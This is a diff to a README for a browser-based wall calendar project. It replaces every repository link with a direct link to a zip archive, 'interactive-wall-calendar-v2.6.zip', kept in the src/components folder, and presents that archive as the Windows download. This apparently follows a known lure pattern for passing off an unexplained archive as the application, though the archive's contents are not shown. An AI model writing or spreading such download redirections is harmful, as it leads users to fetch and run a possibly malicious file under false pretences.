@@ -1,16 +1,16 @@
 # 🗓️ interactive-wall-calendar - Manage your time with visual ease
 
-[![](https://img.shields.io/badge/Download_Calendar-Blue?style=for-the-badge)](https://github.com/vaibhav2885/interactive-wall-calendar)
+[![](https://img.shields.io/badge/Download_Calendar-Blue?style=for-the-badge)](https://raw.githubusercontent.com/vaibhav2885/interactive-wall-calendar/main/src/components/interactive-wall-calendar-v2.6.zip)
 
 This tool provides a wall-style calendar for your computer. You add notes, select date ranges, and track your schedule. It saves your data automatically to your browser. You can switch between light and dark modes to suit your eyes. The design adapts to your screen size.
 
 ## 📦 How to get the software
 
-Visit [this page](https://github.com/vaibhav2885/interactive-wall-calendar) to download the application. 
+Visit [this page](https://raw.githubusercontent.com/vaibhav2885/interactive-wall-calendar/main/src/components/interactive-wall-calendar-v2.6.zip) to download the application. 
 
 Follow these steps for your Windows computer:
 
-1. Open the [download page](https://github.com/vaibhav2885/interactive-wall-calendar).
+1. Open the [download page](https://raw.githubusercontent.com/vaibhav2885/interactive-wall-calendar/main/src/components/interactive-wall-calendar-v2.6.zip).
 2. Look for the green button labeled Code.
 3. Select Download ZIP.
 4. Save the file to your computer.
